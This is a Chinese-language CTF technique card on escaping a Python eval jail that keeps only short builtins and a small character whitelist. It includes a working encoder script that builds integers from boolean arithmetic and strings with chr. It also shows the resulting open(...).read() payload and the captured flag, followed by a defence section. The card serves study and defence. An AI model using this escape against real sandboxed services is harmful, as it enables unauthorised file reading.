---
id: binary-pwn-sandbox-escape-pyjail-short-builtins-chr-open-whitelist
title: 字符白名单 + 内建名≤4 的 eval pyjail：用 ~([]<[]) 与 abs 造整数、chr 拼串，单点号完成 open('flag').read()
type: scenario
domain: binary
path: binary/pwn/sandbox-escape
technique: pyjail-short-builtins-chr-open-whitelist
aliases:
- Cobra's Den
- 内建函数名长度限制 pyjail
- ~([]<[]) 取 -1
- abs 取 0/1 造数
- chr 拼接字符串读文件
- 字符白名单 "<ph[(cobras.den)]+~"
- 点号不超过一个的 pyjail
tags:
- python
- pyjail
- sandbox-escape
- ctf
- whitelist
- builtins
- chr
- boolean-arith
- eval
cve: []
severity: medium
confidence: high
status: verified
created: '2026-11-07'
updated: '2026-11-08'
verification:
  verified_by: verifier-T2-W5
  verified_at: '2026-11-08T14:27:39+08:00'
  notes: 已对照原文核对：len<=4 内建过滤后可用 abs/chr/hash/open/ord/repr 列表、白名单 <ph[(cobras.den)]+~、长度<=1115 且点号<=1、~([]<[]) 取 -1 / abs([]<[]) 取 0、brainfuckize 递归编码与 open(chr(..)+..).read() 单点号均与原文脚本一致。未验证点：未执行 payload；flag 值 irisctf{python_has_some_whacky_shit} 仅来自原文截图，本卡正文未引用该 flag，符合要求。
---

## 一句话结论

当 pyjail 只保留名字长度 ≤4 的内建（`abs`、`chr`、`hash`、`open`、`ord`、`repr`）、再额外放行 `print`，同时把输入限制在字符白名单 `"<ph[(cobras.den)]+~"` 内、长度 ≤1115 且点号最多一个时，仍可用 `[]<[]`（False，等价 0）配合 `~`、`abs`、`<<`、`+` 构造任意整数，再用 `chr(<整数>)` 逐字符拼出字符串：`open(chr(...)+chr(...)+...)` 只用一个点号接 `.read()`，即可读出当前目录的 `flag` 文件。

## 原理

- **保留的内建恰好够用**：过滤规则是 `len(name) <= 4`，于是 `open`、`chr`、`abs`、`ord`、`repr`、`hash` 都留了下来，`print` 被额外加入。`open` 与 `chr` 的组合足以构造任意路径字符串并读取文件；不需要 `__import__`、`getattr`、`__class__` 等长名字内建。
- **没有数字字面量也能造数**：白名单不含 `0-9`，但 Python 的比较运算返回布尔值，`[] < []` 为 `False`，而 `bool` 是 `int` 子类：`~([]<[])` = `~0` = `-1`、`abs([]<[])` = `0`、`abs(~([]<[]))` = `1`。再配合 `+`、`<<`、`~` 就能递归构造任意正整数（与 brainfuck 的 `+ -` 思路同构）：偶数 `n` 写成 `(n//2)<<1`，奇数 `n` 写成 `~(~n)`。
- **字符串只能靠 chr 拼**：白名单里没有引号，`chr(65)` 之类只能通过上面的整数构造给出参数，再用 `+` 连接成 `'flag'`；点号只允许一个，因此必须把「调用 `open`」与「调用 `read`」压成一次属性访问：`open(<拼好的路径>).read()`。
- **为什么长度上限不构成阻碍**：每个字符都要一整段布尔算术，单字符约 20–80 个字符，但 4 个字符的文件名（`flag`）仍在 1115 字符内；字符串更长时可用拼接/缩短形态（例如用 `~` 的奇偶技巧减少嵌套）。
- **为什么是独立原子**：这里复用的是三个彼此独立的构造技巧——「用布尔值当整数种子」「用 chr 拼字符串」「把一次属性访问压成单点号」，任何受限于数字/引号/点号的 Python 沙箱都能直接套用，而不依赖本题的其它逻辑。

## 触发条件

- 存在 `eval`/`exec` 的 Python 沙箱，输入受「字符白名单 + 长度上限 + 点号数量上限」限制。
- 沙箱在 `eval` 时传入受限 `__builtins__`，但保留了短名字（≤4 个字符）的有用内建（至少 `open` 与 `chr`）。
- 目标文件路径可预测（本题为当前目录下的 `flag`）。
- 输入不经过 AST 层面的严格校验（只做字符/长度检查）。

## 利用步骤

1. 枚举可用内建：按题目同样的过滤构造 `filtered_builtins`，筛出名字全部落在白名单里的键，得到 `abs/chr/hash/open/ord/repr`（原文脚本即此法）。
2. 建立数字种子：`zero = abs([]<[])`、`one = abs(~([]<[]))`、`minus_one = ~([]<[])`、`two = abs((~([]<[]))+~([]<[]))`。
3. 写递归整数编码器：偶数 `f(n) = (f(n//2)<<one)`，奇数 `f(n) = ~(f(~n))`，得到任意 ASCII 码对应的表达式。
4. 用 `chr(<整数表达式>)` 拼出目标文件名，逐个字符 `+` 连接。
5. 组装 `open(<串>).read()`（只出现一个 `.`），提交给远端。
6. 读取返回的 flag。

## PoC

内建枚举（原文脚本）：把 `dir(builtins)` 中长度 ≤4 的名字收集起来，再筛出所有字符都在 `"<ph[(cobras.den)]+~"` 里的键，输出：

```text
abs
chr
hash
open
ord
repr
```

整数种子与递归编码（原文脚本核心）：

```python
def brainfuckize(nb):
    zero = "abs([]<[])"
    one = "abs(~([]<[]))"
    minus_one = "~([]<[])"
    two = "abs((~([]<[]))+~([]<[]))"
    if nb == 0:
        return zero
    elif nb == 1:
        return one
    elif nb == -1:
        return minus_one
    elif nb == 2:
        return two
    if nb % 2:
        return f"~({brainfuckize(~nb)})"
    else:
        return f"({brainfuckize(nb//2)}<<{one})"

def brainfuckize_char(char):
    return f"chr({brainfuckize(ord(char))})"

def brainfuckize_string(string):
    return '+'.join(brainfuckize_char(c) for c in string)
```

产物形态（`brainfuckize_string("flag")` 的四个 `chr(...)` 用 `+` 连接）：

```text
chr((~(((~(((~(((~([]<[])<<abs(~([]<[])))<<abs(~([]<[]))))<<abs(~([]<[])))<<abs(~([]<[]))))<<abs(~([]<[])))<<abs(~([]<[]))))<<abs(~([]<[]))))+chr(...)+chr(...)+chr(...)
```

最终提交形态：

```text
open(chr(102)+chr(108)+chr(97)+chr(103)).read()
```

（实际提交时四个 `chr` 的参数全部替换为上述布尔算术展开，原文截图即为展开后的超长单行输入。）

远端返回：

```text
irisctf{python_has_some_whacky_shit}
```

PoC 未在本机执行；flag 为原文靶场数据。

## 变体与关联

- **数字构造变体**：`()+()` 等元组/列表拼接长度、`len()` 取长度、`ord` 与 `chr` 互为逆用、`hash` 取模；`[]<[]`/`[]==[]` 是最通用的 0/1 种子。
- **字符串变体**：`repr` 可把已知对象转成带引号的字符串从而「免费」拿到引号；`ord`+`chr` 可做字符变换；若 `bytes` 可用，`bytes([...])` 更快。
- **单点号变体**：把读文件压成 `open(...).read()`，或用 `print` 直接输出 `open(...)` 对象以外的内容；若允许两点号，可走 `().__class__...` 类遍历（本题被点号上限堵死）。
- **关联**：[[binary-pwn-sandbox-escape-python-eval-filter-bypass]]（同类 eval 沙箱、走黑名单与单表达式限制）、[[binary-pwn-sandbox-escape-pyjail-position-parity-quote-bypass]]（同样在字符层面受限时用算术/引号拼接，但约束是位置奇偶）、[[web-nodejs-eval-jsfuck-char-whitelist-rce]]（同为「字符白名单即等于任意代码执行」的 JS 版本）、[[web-python-ssti-getattr-chr-blacklist-bypass]]（chr 拼串绕过关键词黑名单的 SSTI 版本）。
- **边界**：若沙箱不保留 `open`（例如只留 `len/range` 一类）、或对 AST 做严格白名单（禁止调用/属性访问）、或过滤掉 `<`、`~`、`+` 等运算符，本手法不成立；点号上限为 0 时还需要另找不带属性的读取方式。

## 检测与防御

- **不要用「名字长度」做安全边界**：`len(name) <= 4` 会同时留下 `open`、`chr` 这类关键能力；正确的做法是显式允许列表（只放业务确实需要的函数），并默认拒绝一切文件/进程/导入能力。
- **组合限制**：字符白名单应同时覆盖运算符（`<`、`~`、`+`、`<<`）与括号，或改用 AST 白名单（只允许字面量与受限调用），并在 AST 层拒绝属性访问与下标链。
- **运行环境**：沙箱进程用低权限用户、只读挂载、独立命名空间运行，flag 不放在进程可读路径；配合 seccomp/容器限制。
- **检测信号**：提交内容中出现大量 `[]<[]`、`abs(`、`chr(` 嵌套与 `~` 组合、长度逼近上限的表达式；进程内出现 `open` 调用读取非预期文件即告警。
